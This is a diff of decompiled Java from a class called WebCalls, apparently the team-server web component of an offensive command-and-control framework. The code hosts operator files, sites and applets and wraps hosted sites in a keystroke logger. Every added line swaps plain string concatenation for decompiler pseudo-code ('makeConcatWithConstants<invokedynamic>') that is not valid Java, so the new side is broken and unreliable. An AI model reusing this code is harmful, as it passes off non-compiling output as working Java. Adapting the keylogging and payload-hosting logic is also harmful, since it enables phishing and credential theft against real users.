@@ -57,7 +57,7 @@ public class WebCalls implements ServerHook, WebServer.WebListener {
 
             while(var7.hasNext()) {
                Map var8 = (Map)var7.next();
-               var8.put("Port", var4.getKey() + "");
+               var8.put("Port", ((Class)var4.getKey()).makeConcatWithConstants<invokedynamic>(var4.getKey()));
                var1.add(var8);
             }
          }
@@ -72,23 +72,23 @@ public class WebCalls implements ServerHook, WebServer.WebListener {
 
    public void receivedClient(String var1, String var2, Properties var3, Properties var4, String var5, int var6, boolean var7, String var8, long var9) {
       String var11 = ServerUtils.getRemoteAddress(ServerUtils.getProfile(this.resources), var3);
-      String var12 = var3.get("User-Agent") + "";
-      String var13 = var4.get("id") + "";
-      String var14 = var3.get("Cookie") + "";
+      String var12 = ((Class)var3.get("User-Agent")).makeConcatWithConstants<invokedynamic>(var3.get("User-Agent"));
+      String var13 = ((Class)var4.get("id")).makeConcatWithConstants<invokedynamic>(var4.get("id"));
+      String var14 = ((Class)var3.get("Cookie")).makeConcatWithConstants<invokedynamic>(var3.get("Cookie"));
       this.resources.broadcast("weblog", new WebEvent(var2, var1, var11, var12, "unknown", var5, new HashMap(var4), var8, var9, var6));
    }
 
    public WebServer getWebServer(int var1) throws IOException {
       synchronized(this) {
          WebServer var3;
-         if (!this.servers.containsKey(var1 + "")) {
+         if (!this.servers.containsKey(var1.makeConcatWithConstants<invokedynamic>(var1))) {
             var3 = new WebServer(var1);
             var3.addWebListener(this);
             var3.setResponseFilter(new WebTransforms(ServerUtils.getProfile(this.resources)));
-            this.servers.put(var1 + "", var3);
+            this.servers.put(var1.makeConcatWithConstants<invokedynamic>(var1), var3);
             return var3;
          } else {
-            var3 = (WebServer)this.servers.get(var1 + "");
+            var3 = (WebServer)this.servers.get(var1.makeConcatWithConstants<invokedynamic>(var1));
             if (var3.isSSL()) {
                throw new IOException("Web server bound to " + var1 + " is SSL");
             } else {
@@ -105,14 +105,14 @@ public class WebCalls implements ServerHook, WebServer.WebListener {
    public WebServer getSecureWebServer(Profile var1, int var2) throws IOException {
       synchronized(this) {
          WebServer var4;
-         if (!this.servers.containsKey(var2 + "")) {
+         if (!this.servers.containsKey(var2.makeConcatWithConstants<invokedynamic>(var2))) {
             var4 = new WebServer(var2, true, var1.getSSLKeystore(), var1.getSSLPassword());
             var4.addWebListener(this);
             var4.setResponseFilter(new WebTransforms(ServerUtils.getProfile(this.resources)));
-            this.servers.put(var2 + "", var4);
+            this.servers.put(var2.makeConcatWithConstants<invokedynamic>(var2), var4);
             return var4;
          } else {
-            var4 = (WebServer)this.servers.get(var2 + "");
+            var4 = (WebServer)this.servers.get(var2.makeConcatWithConstants<invokedynamic>(var2));
             if (!var4.isSSL()) {
                throw new IOException("Web server bound to " + var2 + " is not SSL");
             } else {
@@ -124,15 +124,16 @@ public class WebCalls implements ServerHook, WebServer.WebListener {
 
    public boolean isServing(int var1) {
       synchronized(this) {
-         return this.servers.containsKey(var1 + "");
+         return this.servers.containsKey(var1.makeConcatWithConstants<invokedynamic>(var1));
       }
    }
 
    public void host_file(Request var1, ManageUser var2) {
-      File var3 = new File(var1.arg(4) + "");
-      String var4 = var1.arg(5) + "";
+      File var3 = new File(((Class)var1.arg(4)).makeConcatWithConstants<invokedynamic>(var1.arg(4)));
+      String var4 = ((Class)var1.arg(5)).makeConcatWithConstants<invokedynamic>(var1.arg(5));
       if (!CommonUtils.isSafeFile(new File("uploads"), var3)) {
-         CommonUtils.print_error(var2.getNick() + " attempted to host " + var3 + " (unsafe)");
+         String var10000 = var2.getNick();
+         CommonUtils.print_error(var10000 + " attempted to host " + var3 + " (unsafe)");
          var2.writeNow(var1.reply("Failed: File '" + var3 + "' is not in uploads."));
       } else if (!var3.exists()) {
          var2.writeNow(var1.reply("Failed: File '" + var3 + "' does not exist.\nI can't host it."));
@@ -142,13 +143,14 @@ public class WebCalls implements ServerHook, WebServer.WebListener {
          ServeFile var5 = new ServeFile(var3, var4);
          this.finishWebCall2(var1, var2, "file " + var3, var5);
       }
+
    }
 
    public void host_site(Request var1, ManageUser var2) {
-      String var3 = var1.arg(4) + "";
-      String var4 = var1.arg(5) + "";
-      String var5 = var1.arg(6) + "";
-      String var6 = var1.arg(7) + "";
+      String var3 = ((Class)var1.arg(4)).makeConcatWithConstants<invokedynamic>(var1.arg(4));
+      String var4 = ((Class)var1.arg(5)).makeConcatWithConstants<invokedynamic>(var1.arg(5));
+      String var5 = ((Class)var1.arg(6)).makeConcatWithConstants<invokedynamic>(var1.arg(6));
+      String var6 = ((Class)var1.arg(7)).makeConcatWithConstants<invokedynamic>(var1.arg(7));
       if ("true".equals(var4)) {
          Keylogger var7 = new Keylogger(var3, "text/html", var5);
          var7.addKeyloggerListener(new KeyloggerHandler(this.resources, var6));
@@ -161,27 +163,29 @@ public class WebCalls implements ServerHook, WebServer.WebListener {
    }
 
    public void host_data(Request var1, ManageUser var2) {
-      String var3 = var1.arg(4) + "";
-      String var4 = var1.arg(5) + "";
-      String var5 = var1.arg(6) + "";
+      String var3 = ((Class)var1.arg(4)).makeConcatWithConstants<invokedynamic>(var1.arg(4));
+      String var4 = ((Class)var1.arg(5)).makeConcatWithConstants<invokedynamic>(var1.arg(5));
+      String var5 = ((Class)var1.arg(6)).makeConcatWithConstants<invokedynamic>(var1.arg(6));
       StaticContent var6 = new StaticContent(var3, var4, var5);
       this.finishWebCall2(var1, var2, var5, var6);
    }
 
    public void host_applet(Request var1, ManageUser var2) {
-      byte[] var3 = (byte[])((byte[])var1.arg(4));
-      String var4 = var1.arg(5) + "";
-      String var5 = var1.arg(6) + "";
-      String var6 = var1.arg(7) + "";
+      byte[] var3 = (byte[])var1.arg(4);
+      String var4 = ((Class)var1.arg(5)).makeConcatWithConstants<invokedynamic>(var1.arg(5));
+      String var5 = ((Class)var1.arg(6)).makeConcatWithConstants<invokedynamic>(var1.arg(6));
+      String var6 = ((Class)var1.arg(7)).makeConcatWithConstants<invokedynamic>(var1.arg(7));
       ServeApplet var7 = new ServeApplet(var3, var4, new byte[0], var6, var5);
       this.finishWebCall2(var1, var2, var6, var7);
    }
 
    protected void finishWebCall2(Request var1, ManageUser var2, String var3, WebService var4) {
-      String var5 = var1.arg(0) + "";
+      Object var10000 = var1.arg(0);
+      String var5 = ((Class)var10000).makeConcatWithConstants<invokedynamic>(var10000);
       int var6 = (Integer)var1.arg(1);
       boolean var7 = (Boolean)var1.arg(2);
-      String var8 = var1.arg(3) + "";
+      var10000 = var1.arg(3);
+      String var8 = ((Class)var10000).makeConcatWithConstants<invokedynamic>(var10000);
       String var9 = var7 ? "https://" : "http://";
 
       try {
@@ -219,21 +223,22 @@ public class WebCalls implements ServerHook, WebServer.WebListener {
    }
 
    public void kill_site(Request var1, ManageUser var2) {
-      int var3 = Integer.parseInt(var1.arg(0) + "");
-      String var4 = var1.arg(1) + "";
+      int var3 = Integer.parseInt(((Class)var1.arg(0)).makeConcatWithConstants<invokedynamic>(var1.arg(0)));
+      String var4 = ((Class)var1.arg(1)).makeConcatWithConstants<invokedynamic>(var1.arg(1));
       this.deregister(var3, var4);
    }
 
    public void deregister(int var1, String var2) {
       synchronized(this) {
          if (this.isServing(var1)) {
-            WebServer var4 = (WebServer)this.servers.get(var1 + "");
+            WebServer var4 = (WebServer)this.servers.get(var1.makeConcatWithConstants<invokedynamic>(var1));
             if (var4 != null && var4.deregister(var2)) {
-               this.servers.remove(var1 + "");
+               this.servers.remove(var1.makeConcatWithConstants<invokedynamic>(var1));
             }
 
             this.broadcastSiteModel();
          }
+
       }
    }
 
